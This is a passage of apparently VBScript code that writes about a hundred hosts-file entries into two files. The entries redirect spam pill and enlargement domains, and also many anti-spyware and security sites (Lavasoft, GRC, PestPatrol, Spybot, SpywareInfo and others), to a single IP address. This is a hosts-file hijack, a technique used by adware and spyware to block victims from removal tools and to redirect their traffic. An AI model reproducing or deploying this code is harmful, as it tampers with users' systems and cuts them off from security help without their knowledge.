f.writeline ("198.65.164.170  penis.drugsexperts.com")
g.writeline ("198.65.164.170  penis.drugsexperts.com")
f.writeline ("198.65.164.170  penis-enlargement.drugsexperts.com")
g.writeline ("198.65.164.170  penis-enlargement.drugsexperts.com")
f.writeline ("198.65.164.170  viagra-substitute.drugsexperts.com")
g.writeline ("198.65.164.170  viagra-substitute.drugsexperts.com")
f.writeline ("198.65.164.170  male-penis.drugsexperts.com")
g.writeline ("198.65.164.170  male-penis.drugsexperts.com")
f.writeline ("198.65.164.170  little-penis.drugsexperts.com")
g.writeline ("198.65.164.170  little-penis.drugsexperts.com")
f.writeline ("198.65.164.170  pills-for-penis.drugsexperts.com")
g.writeline ("198.65.164.170  pills-for-penis.drugsexperts.com")
f.writeline ("198.65.164.170  my-penis.drugsexperts.com")
g.writeline ("198.65.164.170  my-penis.drugsexperts.com")
f.writeline ("198.65.164.170  small-penis.drugsexperts.com")
g.writeline ("198.65.164.170  small-penis.drugsexperts.com")
f.writeline ("198.65.164.170  natural-penis.drugsexperts.com")
g.writeline ("198.65.164.170  natural-penis.drugsexperts.com")
f.writeline ("198.65.164.170  bigger-penis.drugsexperts.com")
g.writeline ("198.65.164.170  bigger-penis.drugsexperts.com")
f.writeline ("198.65.164.170  long-penis.drugsexperts.com")
g.writeline ("198.65.164.170  long-penis.drugsexperts.com")
f.writeline ("198.65.164.170  small-breast.drugsexperts.com")
g.writeline ("198.65.164.170  small-breast.drugsexperts.com")
f.writeline ("198.65.164.170  pills-for-penis-enlargement.drugsexperts.com")
g.writeline ("198.65.164.170  pills-for-penis-enlargement.drugsexperts.com")
f.writeline ("198.65.164.170  big-penis-size.drugsexperts.com")
g.writeline ("198.65.164.170  big-penis-size.drugsexperts.com")
f.writeline ("198.65.164.170  biggest-penis.drugsexperts.com")
g.writeline ("198.65.164.170  biggest-penis.drugsexperts.com")
f.writeline ("198.65.164.170  large-penis.drugsexperts.com")
g.writeline ("198.65.164.170  large-penis.drugsexperts.com")
f.writeline ("198.65.164.170  bigger-breast.drugsexperts.com")
g.writeline ("198.65.164.170  bigger-breast.drugsexperts.com")
f.writeline ("198.65.164.170  breast-enhancement.drugsexperts.com")
g.writeline ("198.65.164.170  breast-enhancement.drugsexperts.com")
f.writeline ("198.65.164.170  penis-size.drugsexperts.com")
g.writeline ("198.65.164.170  penis-size.drugsexperts.com")
f.writeline ("198.65.164.170  huge-cock.drugsexperts.com")
g.writeline ("198.65.164.170  huge-cock.drugsexperts.com")
f.writeline ("198.65.164.170  huge-penis.drugsexperts.com")
g.writeline ("198.65.164.170  huge-penis.drugsexperts.com")
f.writeline ("198.65.164.170  enlarge-breast.drugsexperts.com")
g.writeline ("198.65.164.170  enlarge-breast.drugsexperts.com")
f.writeline ("198.65.164.170  www.penisenlargementdirectory.com")
g.writeline ("198.65.164.170  www.penisenlargementdirectory.com")
f.writeline ("198.65.164.170  www.bigger-penis-enlargement-pill.com")
g.writeline ("198.65.164.170  www.bigger-penis-enlargement-pill.com")
f.writeline ("198.65.164.170  www.penis-enlargement-site.com")
g.writeline ("198.65.164.170  www.penis-enlargement-site.com")
f.writeline ("198.65.164.170  www.penisenlargementmagazine.com")
g.writeline ("198.65.164.170  www.penisenlargementmagazine.com")
f.writeline ("198.65.164.170  www.health-infosheet.com")
g.writeline ("198.65.164.170  www.health-infosheet.com")
f.writeline ("198.65.164.170  www.search4-vigrx.com")
g.writeline ("198.65.164.170  www.search4-vigrx.com")
f.writeline ("198.65.164.170  infomercial.tvheaven.com")
g.writeline ("198.65.164.170  infomercial.tvheaven.com")
f.writeline ("198.65.164.170  www.advinfoprod.com")
g.writeline ("198.65.164.170  www.advinfoprod.com")
f.writeline ("198.65.164.170  penismedical.com")
g.writeline ("198.65.164.170  penismedical.com")
f.writeline ("198.65.164.170  www.alles-bleibt-besser.com")
g.writeline ("198.65.164.170  www.alles-bleibt-besser.com")
f.writeline ("198.65.164.170  www.penemaster.com")
g.writeline ("198.65.164.170  www.penemaster.com")
f.writeline ("198.65.164.170  www.info-pene.com")
g.writeline ("198.65.164.170  www.info-pene.com")
f.writeline ("198.65.164.170  www.penis-penile-enlargement.com")
g.writeline ("198.65.164.170  www.penis-penile-enlargement.com")
f.writeline ("198.65.164.170  www.sexcia.com")
g.writeline ("198.65.164.170  www.sexcia.com")
f.writeline ("198.65.164.170  www.credo.iq.pl")
g.writeline ("198.65.164.170  www.credo.iq.pl")
f.writeline ("198.65.164.170  pills.b0x.com")
g.writeline ("198.65.164.170  pills.b0x.com")
f.writeline ("198.65.164.170  vigrx-penis-pills.wnrq.com")
g.writeline ("198.65.164.170  vigrx-penis-pills.wnrq.com")
f.writeline ("198.65.164.170  www.1stvitality.co.uk")
g.writeline ("198.65.164.170  www.1stvitality.co.uk")
f.writeline ("198.65.164.170  www.helpuniversity.com")
g.writeline ("198.65.164.170  www.helpuniversity.com")
f.writeline ("198.65.164.170  www.smithgrind.com")
g.writeline ("198.65.164.170  www.smithgrind.com")
f.writeline ("198.65.164.170  www.big-cock-site.com")
g.writeline ("198.65.164.170  www.big-cock-site.com")
f.writeline ("198.65.164.170  www.penilefitness.com")
g.writeline ("198.65.164.170  www.penilefitness.com")
f.writeline ("198.65.164.170  mensniche.com")
g.writeline ("198.65.164.170  mensniche.com")
f.writeline ("198.65.164.170  www.mensniche.com")
g.writeline ("198.65.164.170  www.mensniche.com")
f.writeline ("198.65.164.170  www.vig-rxoil.netfirms.com")
g.writeline ("198.65.164.170  www.vig-rxoil.netfirms.com")
f.writeline ("198.65.164.170  www.totalpenis.com")
g.writeline ("198.65.164.170  www.totalpenis.com")
f.writeline ("198.65.164.170  www.puppetryofthepenis.com")
g.writeline ("198.65.164.170  www.puppetryofthepenis.com")
f.writeline ("198.65.164.170  www.my-penis.org")
g.writeline ("198.65.164.170  www.my-penis.org")
f.writeline ("198.65.164.170  www.penisowner.com")
g.writeline ("198.65.164.170  www.penisowner.com")
f.writeline ("198.65.164.170  www.meinpenis.com")
g.writeline ("198.65.164.170  www.meinpenis.com")
f.writeline ("198.65.164.170  vigrx.com")
g.writeline ("198.65.164.170  vigrx.com")
f.writeline ("198.65.164.170  www.vigrx.com")
g.writeline ("198.65.164.170  www.vigrx.com")
f.writeline ("198.65.164.170  www.herbal-breast-enlargement-pills.net")
g.writeline ("198.65.164.170  www.herbal-breast-enlargement-pills.net")
f.writeline ("198.65.164.170  tutorial.dreamhost.com")
g.writeline ("198.65.164.170  tutorial.dreamhost.com")
f.writeline ("198.65.164.170  www.penis-enlargement-secrets.com")
g.writeline ("198.65.164.170  www.penis-enlargement-secrets.com")
f.writeline ("198.65.164.170  www.spywarelabs.com")
g.writeline ("198.65.164.170  www.spywarelabs.com")
f.writeline ("198.65.164.170  www.lavasoftusa.com")
g.writeline ("198.65.164.170  www.lavasoftusa.com")
f.writeline ("198.65.164.170  www.pchell.com")
g.writeline ("198.65.164.170  www.pchell.com")
f.writeline ("198.65.164.170  grc.com")
g.writeline ("198.65.164.170  grc.com")
f.writeline ("198.65.164.170  www.unwantedlinks.com")
g.writeline ("198.65.164.170  www.unwantedlinks.com")
f.writeline ("198.65.164.170  www.pestpatrol.com")
g.writeline ("198.65.164.170  www.pestpatrol.com")
f.writeline ("198.65.164.170  www.doxdesk.com")
g.writeline ("198.65.164.170  www.doxdesk.com")
f.writeline ("198.65.164.170  www.spywareremove.com")
g.writeline ("198.65.164.170  www.spywareremove.com")
f.writeline ("198.65.164.170  www.spychecker.com")
g.writeline ("198.65.164.170  www.spychecker.com")
f.writeline ("198.65.164.170  spywareremovers.net")
g.writeline ("198.65.164.170  spywareremovers.net")
f.writeline ("198.65.164.170  www.enigmasoftwaregroup.com")
g.writeline ("198.65.164.170  www.enigmasoftwaregroup.com")
f.writeline ("198.65.164.170  1spybot.com")
g.writeline ("198.65.164.170  1spybot.com")
f.writeline ("198.65.164.170  www.spybot-download.com")
g.writeline ("198.65.164.170  www.spybot-download.com")
f.writeline ("198.65.164.170  www.webattack.com")
g.writeline ("198.65.164.170  www.webattack.com")
f.writeline ("198.65.164.170  www.thiefware.com")
g.writeline ("198.65.164.170  www.thiefware.com")
f.writeline ("198.65.164.170  cexx.org")
g.writeline ("198.65.164.170  cexx.org")
f.writeline ("198.65.164.170  www.spywareonline.org")
g.writeline ("198.65.164.170  www.spywareonline.org")
f.writeline ("198.65.164.170  www.spywareinfo.com")
g.writeline ("198.65.164.170  www.spywareinfo.com")
f.writeline ("198.65.164.170  www.abc3x.com")
g.writeline ("198.65.164.170  www.abc3x.com")
f.writeline ("198.65.164.170  www.penis-enlargement-procedure.com")
g.writeline ("198.65.164.170  www.penis-enlargement-procedure.com")
f.writeline ("198.65.164.170  www.your-search.info")
g.writeline ("198.65.164.170  www.your-search.info")
f.writeline ("198.65.164.170  nkvd.us")
g.writeline ("198.65.164.170  nkvd.us")
f.Close
g.Close
